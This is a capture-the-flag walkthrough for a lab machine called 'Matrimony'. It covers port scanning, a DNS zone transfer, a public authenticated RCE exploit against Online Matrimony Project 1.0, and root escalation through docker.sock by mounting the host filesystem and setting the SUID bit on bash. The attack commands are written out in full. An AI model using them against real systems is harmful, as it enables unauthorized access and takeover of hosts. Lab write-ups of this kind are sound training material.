---
icon: ubuntu
---

# Matrimony - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```bash
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.209.196 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-08 21:16 EDT
Nmap scan report for 192.168.209.196
Host is up (0.028s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Vanilla Bootstrap v4.2.1 Theme
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   26.47 ms 192.168.45.1
2   26.42 ms 192.168.45.254
3   27.81 ms 192.168.251.1
4   28.00 ms 192.168.209.196
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

This is one giant static site. Maybe the background just makes it seem big :rofl:

Ok I am going to try to add some domain names to /etc/hosts and try DNS enumeration

```
192.168.209.196 matrimony.off
```

### <mark style="color:$primary;">DNS Enumeration</mark>

```
dig axfr @192.168.209.196 matrimony.off
```

<figure><img src="../../.gitbook/assets/image (274).png" alt=""><figcaption></figcaption></figure>

It finds another subdomain `prod99` I will add it to my /etc/hosts file

```
192.168.209.196 matrimony.off prod99.matrimony.off
```

<figure><img src="../../.gitbook/assets/image (275).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (276).png" alt=""><figcaption></figcaption></figure>

A new website, it's running on apache

### <mark style="color:$primary;">Online Matrimony Project 1.0 Authenticated RCE</mark>

<figure><img src="../../.gitbook/assets/image (277).png" alt=""><figcaption></figcaption></figure>

searchsploit reveals an authenticated RCE, I am going to create an account and try the exploit out

<figure><img src="../../.gitbook/assets/image (278).png" alt=""><figcaption></figcaption></figure>

```
searchsploit -m 49183.py
```

```bash
python2 49183.py http://prod99.matrimony.off/ deimos deimos
```

<figure><img src="../../.gitbook/assets/image (279).png" alt=""><figcaption></figcaption></figure>

Now to get a better shell

<figure><img src="../../.gitbook/assets/image (281).png" alt=""><figcaption></figcaption></figure>

I am going to setup ssh connection. If you need a guide checkout [**Synapse**](synapse-hard.md#setup-ssh)

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>

Checking `ifconfig`, we can find some Docker instances running since the IP of this machine is 172.17.0.1

<figure><img src="../../.gitbook/assets/image (283).png" alt=""><figcaption></figcaption></figure>

Here we see that there is an available network connection to the Docker container. In the highlighted line, we can see that the host 172.17.0.1 is connected to the docker instance 172.17.0.2. This means that we can SSH in the container.

When we try to log in as root, we successfully log into the container.

<figure><img src="../../.gitbook/assets/image (284).png" alt=""><figcaption></figcaption></figure>

One of the first things to check when we have root privileges on a container is if we have access to docker.sock.

### <mark style="color:$primary;">Docker.sock -> root</mark>

<figure><img src="../../.gitbook/assets/image (287).png" alt=""><figcaption></figcaption></figure>

This machine doesn't have `docker`, so we can download the binary itself from our machine.

İmport the Docker binary from the target host to the container.

<figure><img src="../../.gitbook/assets/image (286).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (288).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (289).png" alt=""><figcaption></figcaption></figure>

We find that we have 2 different image IDs, we can choose the one we want. We create a container and mount the target host’s / root directory to our new container.

{% code overflow="wrap" %}
```bash
./docker -H unix:///run/docker.sock run -it -v /:/mnt 3f4714ee068a bash
```
{% endcode %}

We can check the /mnt folder to see if we have successfully mounted the /root directory into this new container.

<figure><img src="../../.gitbook/assets/image (290).png" alt=""><figcaption></figcaption></figure>

To get a `root` shell, simply run `chmod u+s /mnt/bin/bash`. Exit the docker container back onto the host machine and run `bash -p`

<figure><img src="../../.gitbook/assets/image (291).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (292).png" alt=""><figcaption></figcaption></figure>
